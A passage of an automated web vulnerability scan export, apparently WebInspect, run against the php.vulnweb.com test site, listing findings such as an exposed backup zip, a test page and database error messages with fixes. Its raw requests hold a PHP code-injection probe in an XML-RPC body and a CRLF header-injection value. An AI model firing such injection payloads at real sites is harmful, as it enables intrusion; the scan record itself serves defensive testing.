]]></AttackHTTPRequest><VulnerabilityID>11444</VulnerabilityID><Severity>3</Severity><Name>Archived File (zip)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-530" href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected an archive file with the .zip extension on the target server. The severity of the threats posed by the web-accessible backup files depends on the sensitivity of the information stored in original document. Based on that information, an attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker can use information obtained to craft precise targeted attacks, which may not otherwise be feasible, against the application. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker can use the information obtained from the backup file of a sensitive document to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~  and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.  ]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<ul><li> Webroot Security Policy: Implement a security policy that prohibits storage of backup files in webroot. </li><li> Temporary Files: Many tools and editors automatically create temporary files or backup files in the webroot. Be careful when editing files on a production server to avoid inadvertently leaving a backup or temporary copy of the file(s) in the webroot. </li><li> Default Installations: Often, a lot of unnecessary files and folders are installed by default. For instance, IIS installations include demo applications. Be sure to remove any files or folders that are not required for application to work properly. </li><li> Development Backup: Source code back up should not be stored and left available on the webroot. </li></ul>
Further QA can include test cases to look for the presence of backup files in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<ul><li><a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)">OWASP  - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004) </a><br /></li><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure </a></li></ul>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="AE5C6BFA106D61173E9FA0632997C3D8"><![CDATA[GET /index.zip HTTP/1.1
Referer: http://php.vulnweb.com/index.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="AE5C6BFA106D61173E9FA0632997C3D8";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11444";Engine="File+Extension+Replacement";SmartMode="4";tid="46";tt="40";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="4b54fc38";
X-Request-Memo: ID="5d8a0e38";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:04 GMT
ETag: "11453d-a1a"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/zip
Accept-Ranges: bytes
Last-Modified: Wed, 14 Jan 1970 02:23:57 GMT
Content-Length: 51

<truncated>application/x-zip-compressed</truncated>]]></RawResponse><Request id="AE5C6BFA106D61173E9FA0632997C3D8"><Method>GET</Method><Path>/</Path><File>index</File><Ext>zip</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="AE5C6BFA106D61173E9FA0632997C3D8";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11444";Engine="File+Extension+Replacement";SmartMode="4";tid="46";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="41";smi="0";sc="1";ID="4b54fc38";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="5d8a0e38";sc="1";tid="46";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<truncated>application/x-zip-compressed</truncated>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:04 GMT</Value></Header><Header><Name>ETag</Name><Value>"11453d-a1a"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/zip</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 14 Jan 1970 02:23:57 GMT</Value></Header><Header><Name>Content-Length</Name><Value>51</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B9BD43FAD1965669768215562DE40A5F"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="B9BD43FAD1965669768215562DE40A5F"><![CDATA[HEAD /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Server: nginx/1.19.0
Date: Fri, 11 Dec 2020 21:46:06 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Location: login.php

]]></RawResponse><Request id="B9BD43FAD1965669768215562DE40A5F"><Method>HEAD</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody /><Headers><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:06 GMT</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>Connection</Name><Value>close</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A812006D85F276D9F0F594E945BE2842"><URL>http://php.vulnweb.com:80/Flash/add.fla</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="A812006D85F276D9F0F594E945BE2842"><![CDATA[GET /Flash/add.fla HTTP/1.1
Referer: http://php.vulnweb.com/Flash/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="A812006D85F276D9F0F594E945BE2842";PSID="F2A0902254BF718D2D648BD01F9C037B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="83";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="25a8b0e5";
X-Request-Memo: ID="d3abb9f8";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:33 GMT
ETag: "4dca64a1-25c00"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:45 GMT
Content-Length: 47

<truncated>application/octet-stream</truncated>]]></RawResponse><Request id="A812006D85F276D9F0F594E945BE2842"><Method>GET</Method><Path>/Flash/</Path><File>add</File><Ext>fla</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Flash/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="A812006D85F276D9F0F594E945BE2842";PSID="F2A0902254BF718D2D648BD01F9C037B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="83";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="25a8b0e5";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d3abb9f8";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<truncated>application/octet-stream</truncated>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:33 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a1-25c00"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:45 GMT</Value></Header><Header><Name>Content-Length</Name><Value>47</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C9FFEF4263832BBEF14FAB38541A114A"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C9FFEF4263832BBEF14FAB38541A114A"><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Content-Length: 168
Connection: Keep-Alive
Cookie: CustomCookie=WebInspect0

<?xml version="1.0"?><methodCall><methodName>test.method</methodName><params><param><value><name>','')); phpinfo(); exit;/*</name></value></param></params></methodCall>]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:35 GMT
Server: nginx/1.19.0
Location: login.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 14

you must login]]></RawResponse><Request id="C9FFEF4263832BBEF14FAB38541A114A"><Method>POST</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[<?xml version="1.0"?><methodCall><methodName>test.method</methodName><params><param><value><name>','')); phpinfo(); exit;/*</name></value></param></params></methodCall>]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Content-Length</Name><Value>168</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[you must login]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:35 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>14</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="09041F437D2871D9A09316BC29A3CB1E"><URL>http://php.vulnweb.com:80/hpp/test.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="b3df8f79-8363-4aa6-a31d-ffadaa52b324"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/test.php HTTP/1.1
Referer: http://php.vulnweb.com/hpp/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="09041F437D2871D9A09316BC29A3CB1E";PSID="04A7DE02AE4076FC68850A0F3E81559D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="5";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10423";Engine="Request+Modify";SmartMode="4";tid="55";tt="11";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="a30745d9";
X-Request-Memo: ID="1088ea46";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10423</VulnerabilityID><Severity>2</Severity><Name>Common Application Test Files</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-538" href="https://cwe.mitre.org/data/definitions/538.html">CWE-538: File and Directory Information Exposure</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Testing-related application pages were found.  Test pages are usually implemented ad-hoc and often do not adhere to the security requirements/guidelines of the rest of the application, making them a potential security hazard.  Recommendations include restricting access to only those with an actual need to access the page, or if applicable, removing the information from the production server.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The impact of this vulnerability depends on what information/functionality was discovered in the test-related application page.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
 

Either remove this file from the production server or restrict access to only authorized users.  Restrict access to important files or directories only to those who actually need it.  Enforce consistent authentication across your entire application and apply it to the entire directory structure, including subdirectories. 

<br /><br /><b>For Development:</b><br />
 

Ensure that files containing sensitive information or test functionality are not left publicly accessible. 

<br /><br /><b>For QA: </b><br />

 
Ensure that files containing sensitive information or test functionality are not left publicly accessible.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS:</b><br /><a href="https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/authentication/basicauthentication">https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/authentication/basicauthentication</a><br /><br /><b>Implementing Basic Authentication in Apache:</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="09041F437D2871D9A09316BC29A3CB1E"><![CDATA[GET /hpp/test.php HTTP/1.1
Referer: http://php.vulnweb.com/hpp/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="09041F437D2871D9A09316BC29A3CB1E";PSID="04A7DE02AE4076FC68850A0F3E81559D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="5";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10423";Engine="Request+Modify";SmartMode="4";tid="55";tt="11";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="a30745d9";
X-Request-Memo: ID="1088ea46";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:05 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 33

/link?something=%2Fhpp%2Ftest.php]]></RawResponse><Request id="09041F437D2871D9A09316BC29A3CB1E"><Method>GET</Method><Path>/hpp/</Path><File>test</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="09041F437D2871D9A09316BC29A3CB1E";PSID="04A7DE02AE4076FC68850A0F3E81559D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="5";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10423";Engine="Request+Modify";SmartMode="4";tid="55";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="a30745d9";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1088ea46";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[/link?something=%2Fhpp%2Ftest.php]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:05 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>33</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="4FD5C49B0257874F1499B14261052F7B"><URL>http://php.vulnweb.com:80/listproducts.php?cat=2%0d%0aSPIHeader:%20SPIValue</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>cat</AttackParamDescriptor><Issues><Issue id="8a4b0a34-19f2-499b-9e2b-212d8e06cd1d"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10026</EngineType><AttackHTTPRequest /><VulnerabilityID>742</VulnerabilityID><Severity>4</Severity><Name>Database Server Error Message</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="2287" length="24" /><Location offset="2355" length="20" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Critical database server error message vulnerabilities were identified in the web application, indicating that an unhandled exception was generated in your web application code. Unhandled exceptions are circumstances in which the application has received user input that it did not expect and does not know how to handle. When successfully exploited, an attacker can gain unauthorized  access to the database by using the information recovered from seemingly innocuous error messages to pinpoint flaws in the web application and to discover additional avenues of attack. Recommendations include designing and adding consistent error-handling mechanisms that are capable of handling any user input  to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed. 

<br /><br /><b>Description</b><br /><br />


The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors.  All web applications in their normal course of operation will at some point receive an unhandled exception.  The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors.  For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist.  However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application.

<br /><br />

The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give  the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.  

<br /><br />

Be aware that this check is part of unknown application testing which seeks to uncover new vulnerabilities in both custom and commercial software. Because of this, there are no specific patches or remediation information for this issue.  Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.

]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The severity of this vulnerability depends on the reason that the error message was generated.  In most cases, it will be the result of the web application 

attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug or bug is responsible for triggering the error, the potential impact will vary, depending on the 

circumstances. 

The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
The information gleaned from database server error messages allows an attacker to conduct a successful attack after he combines his various findings. You can verify the database error response is highlighted in response tab. The ways in which an attacker can exploit the conditions that caused the error depend on its cause. In the case of SQL injection, the techniques that are used will vary from database server to database server, and even query to query. An overview SQL Injection attacks is available in the SQL Injection vulnerability information, accessible via the Policy Manager.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development: </b><br /><br />
From a development perspective, the best method of preventing problems from arising from database error messages is to adopt secure programming techniques that prevent problems that might arise from an attacker discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. 


<ul><li>
Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul><b>For Security Operations: </b><br /><br />
The following recommendations will help in implementing a secure database protocol for your web application.   Be advised each database has its own method of  
secure lock down. <br /><br /><ul><li><b> ODBC Error Messaging:  </b>Turn off ODBC error messaging in your database server. Never display raw ODBC or other errors to the end user.  See Removing Detailed Error Messages below, or consult your database server's documentation, for more information. 


  </li><br /><li><b>Uniform Error Codes: </b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error  
messages.  For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file  
